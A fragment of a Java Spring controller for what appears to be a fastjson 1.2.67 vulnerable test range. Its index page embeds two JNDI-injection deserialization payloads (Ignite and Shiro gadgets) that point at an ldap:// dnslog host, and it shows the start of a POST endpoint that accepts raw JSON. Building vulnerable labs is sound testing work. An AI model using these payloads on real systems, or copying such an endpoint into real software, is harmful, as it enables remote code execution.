...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.67"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.67 靶场测试页", "/fastjson1.2.67-process", new String[]{
                "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://fastjson1.2.67-process.dnslog.cn/Exploit\"], \"tm\": {\"$ref\":\"$.tm\"}}",
                "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://fastjson1.2.67-process.dnslog.cn/Exploit\",\"instance\":{\"$ref\":\"$.instance\"}}"
        }, "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}");
    }

    @PostMapping("/fastjson1.2.67-process")
    public String fastjson1_2_67_process(@RequestBody String data) {
